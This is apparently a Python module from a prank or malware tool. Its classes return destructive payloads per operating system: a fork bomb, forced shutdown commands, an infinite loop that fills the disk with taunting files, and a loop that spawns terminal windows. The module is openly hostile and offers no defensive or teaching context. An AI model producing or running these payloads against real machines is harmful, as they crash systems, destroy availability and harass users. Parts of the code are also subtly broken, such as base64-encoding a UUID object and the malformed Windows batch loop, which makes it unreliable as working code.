from base64 import b64encode
from uuid import uuid1


class BasePayload(object):
    __payload_name__ = "Base Class of Payload"
    __payload_number__ = 0

    @staticmethod
    def get_file_name():
        return str(b64encode(uuid1())).replace("=", "")

    def get_payload(self, current_os):
        return None


class ForkBomb(BasePayload):
    __payload_name__ = "Fork Bomb"
    __payload_number__ = 1

    def get_payload(self, current_os):
        payload = ":(){ :|: & };:"
        return payload


class ShutDown(BasePayload):
    __payload_name__ = "Shut Down"
    __payload_number__ = 2

    def get_payload(self, current_os):
        payload = None
        if current_os == "Linux" or current_os == "Darwin":
            payload = "shutdown -h now"
        elif current_os == "Windows":
            payload = "shutdown /s"

        return payload


class BulkFileCreation(BasePayload):
    __payload_name__ = "Bulk File creation"
    __payload_number__ = 3

    def get_payload(self, current_os):
        payload = None
        if current_os == "Linux" or current_os == "Darwin":
            payload = f"""
            count="0"
            while [ $count -gt -1 ]
            do
            echo "hehe u stoopid x$count" > {self.get_file_name()}_$count.lol
            count=$[$count+1]
            done
            """
        elif current_os == "Windows":
            payload = f"""
            @echo off 
            Set count=0
            :a 
            if %count% gtr -1 () else (set /a count+=1)
            type "hehe u stoopid x%count%" > {self.get_file_name()}_%count%.lol
            goto :a 
            """

        return payload


# open 4 terminal
"""
i="0"

while [ $i -lt 4 ]
do
xterm &
i=$[$i+1]
done"""
